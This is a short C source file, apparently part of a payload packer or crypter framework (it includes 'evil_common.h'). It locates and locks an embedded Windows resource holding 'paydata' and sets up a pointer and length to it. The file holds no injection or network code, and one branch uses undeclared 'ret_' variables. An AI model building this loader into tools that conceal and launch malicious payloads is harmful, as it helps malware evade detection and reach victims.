//@@@headers
#include "locate_resource.h"
#include "evil_common.h"
//@@@endheaders

//@@@zvars
unsigned char* locate_paydata; // locate.h
size_t locate_paydatalen; // locate.h
BOOL locate_bReadOnly; // locate.h

locate_resource_vars_t v_locate_resource;
//@@@endzvars

SPRAYABLE_PROC(locate)
{
  //@@@proc /name locate
  Z(v_locate_resource).hSelf = GET_HINSTANCE();
  Z(v_locate_resource).imageResHandle = FindResourceA(Z(v_locate_resource.hSelf), MAKEINTRESOURCE(ADDRESOURCE_RES_ID), MAKEINTRESOURCE(ADDRESOURCE_RES_TYPE));

  Z(v_locate_resource).imageResDataHandle = LoadResource(Z(v_locate_resource.hSelf), Z(v_locate_resource.imageResHandle));
  Z(locate_paydata) = (BYTE*)LockResource(Z(v_locate_resource.imageResDataHandle));

#ifdef BIN2MEDIA_ORIG_LEN
  Z(locate_paydatalen) = BIN2MEDIA_ORIG_LEN;

#ifdef BIN2MEDIA_OFFSET
  Z(locate_paydata) += BIN2MEDIA_OFFSET;
#endif

#else
  Z(locate_paydatalen) = SizeofResource(Z(v_locate_resource.hSelf), Z(v_locate_resource.imageResHandle));
#ifdef BIN2MEDIA_OFFSET
  Z(ret_locate_paydata) += BIN2MEDIA_OFFSET;
  Z(ret_locate_paydatalen) -= BIN2MEDIA_OFFSET;
#endif

#endif

  //XASSERT(v_locate_resource.dwResourceSize == CRYPTBIN_COUNT * 4);
  //v_locate_resource.lpResourceCopy = malloc(v_locate_resource.dwResourceSize);
  //memcpy(v_locate_resource.lpResourceCopy, v_locate_resource.lpResource, v_locate_resource.dwResourceSize);

  Z(locate_bReadOnly) = TRUE; // resource is readonly, need duplicate mem

  //@@@endproc 
}

// Nothing to do. MSDN says  It is not necessary to unlock resources because the system automatically deletes them when the process that created them terminates.
//SPRAYABLE_PROC(unlocate) {
//  // proc /name unlocate
//  // endproc
//}

